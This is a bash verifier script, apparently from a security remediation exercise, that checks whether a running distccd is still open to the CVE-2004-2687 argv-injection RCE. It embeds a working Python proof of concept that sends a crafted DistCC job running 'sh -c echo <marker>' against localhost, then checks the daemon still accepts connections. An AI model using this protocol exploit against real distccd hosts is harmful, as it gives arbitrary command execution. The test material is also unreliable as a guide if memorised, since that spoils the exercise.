#!/bin/bash
# Scenario 15: DistCC Unrestricted Access -> RCE (CVE-2004-2687)
#
# BEHAVIOURAL verifier. It speaks the real DistCC protocol to the RUNNING
# distccd and asks it to run a command (the argv-injection that distccd will
# execute as a "compiler"). If the command's output comes back, the box is
# exploitable. It does NOT grep the --allow flag or /start.sh, and it NEVER
# starts distccd -- a dead daemon is a real failure.
#
# The remediation keeps distccd running but restricts --allow to a trusted
# non-loopback range, so this localhost PoC is denied by the access list while
# the compile farm stays available. Editing /start.sh without restarting the
# live daemon leaves it exploitable (notrestart => FAIL).
#
# Exit 0 = remediated, Exit 1 = still vulnerable or broken.
set -u
HOST=127.0.0.1
PORT=3632

# distccd must already be running; the verifier must not start it.
if ! pgrep -x distccd >/dev/null 2>&1; then
    echo "FAIL [Regression]: distccd is not running -- a dead service is a failure" >&2
    echo "                   (verify.sh must not start it)." >&2
    exit 1
fi

# Wait (bounded) for the port to accept connections.
UP=0
for i in $(seq 1 20); do
    if ss -tln 2>/dev/null | grep -q ":$PORT " || netstat -tln 2>/dev/null | grep -q ":$PORT "; then
        UP=1; break
    fi
    sleep 1
done
if [ "$UP" != 1 ]; then
    echo "FAIL [Regression]: distccd is not listening on port $PORT -- service down/broken." >&2
    exit 1
fi

# PoC: DistCC argv injection. Send a job whose "compiler" argv is
# `sh -c 'echo <marker>'`; distccd executes it and returns stdout in the SOUT
# token. Seeing the marker == arbitrary command execution.
MARKER="DISTCC_RCE_$$_$(date +%s)"
POC_OUT=$(MARKER="$MARKER" python - "$HOST" "$PORT" <<'PYEOF' 2>/dev/null
import socket, sys, os
host = sys.argv[1]; port = int(sys.argv[2])
marker = os.environ["MARKER"]
argv = ["sh", "-c", "echo " + marker, "#", "-c", "main.c", "-o", "main.o"]
req = "DIST%08x" % 1
req += "ARGC%08x" % len(argv)
for a in argv:
    req += "ARGV%08x" % len(a) + a
doti = "int main(){return 0;}\n"
req += "DOTI%08x" % len(doti) + doti
try:
    s = socket.socket(); s.settimeout(10); s.connect((host, port))
    s.sendall(req)
    data = ""
    while True:
        b = s.recv(4096)
        if not b:
            break
        data += b
    s.close()
except Exception:
    data = ""
sys.stdout.write(data)
PYEOF
)

if echo "$POC_OUT" | grep -q "$MARKER"; then
    echo "FAIL [PoC]: distccd executed an injected command via the DistCC protocol" >&2
    echo "            (marker '$MARKER' returned in the SOUT token) -- remote code execution." >&2
    exit 1
fi
echo "PASS [PoC]: distccd did not execute the injected command from this host (access denied)."

# Regression: the daemon is still up and REACHABLE for legitimate clients.
#
# A listening-socket check alone is firewall-agnostic: an `iptables -j DROP` (or
# any block-all mitigation) that denies EVERY client — including the trusted
# compile farm — would leave the socket in LISTEN yet make the PoC time out, so
# a total block would masquerade as the intended `--allow` restriction. The
# correct fix (scope --allow to a trusted range) keeps distccd ACCEPTING TCP
# connections (it completes the handshake, then denies the job by client IP),
# whereas a block-all mitigation drops the SYN and the connection never
# establishes. So we require the TCP handshake itself to still succeed.
if ! pgrep -x distccd >/dev/null 2>&1; then
    echo "FAIL [Regression]: distccd is no longer running." >&2
    exit 1
fi
CONN=$(python - "$HOST" "$PORT" <<'PYEOF' 2>/dev/null
import socket, sys
host = sys.argv[1]; port = int(sys.argv[2])
s = socket.socket(); s.settimeout(5)
try:
    s.connect((host, port))
    sys.stdout.write("CONNECT_OK")
except Exception:
    sys.stdout.write("CONNECT_FAIL")
finally:
    s.close()
PYEOF
)
if [ "$CONN" != "CONNECT_OK" ]; then
    echo "FAIL [Regression]: distccd did not accept a TCP connection on port $PORT —" >&2
    echo "                   the service has been blocked/bricked for ALL clients," >&2
    echo "                   not merely restricted to a trusted range." >&2
    exit 1
fi
echo "PASS [Regression]: distccd still accepts TCP connections on port $PORT"
echo "                   (reachable by legitimate clients; PoC denied by --allow)."

echo "All checks passed."
exit 0
